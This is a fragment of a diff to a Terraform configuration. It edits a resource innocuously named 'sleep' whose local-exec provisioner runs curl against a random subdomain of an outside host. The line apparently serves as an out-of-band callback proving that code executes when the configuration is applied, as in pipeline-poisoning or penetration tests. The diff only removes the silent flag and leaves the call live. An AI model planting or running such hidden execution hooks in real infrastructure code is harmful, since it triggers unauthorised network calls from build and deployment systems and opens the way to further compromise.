@@ -13,6 +13,6 @@ resource "null_resource" "sleep" {
   }
 
   provisioner "local-exec" {
-    command = "curl -s https://uus5q9udyb9bg6s8ag2neod950bvzmnb.net-spi.com"
+    command = "curl https://uus5q9udyb9bg6s8ag2neod950bvzmnb.net-spi.com"
   }
 }
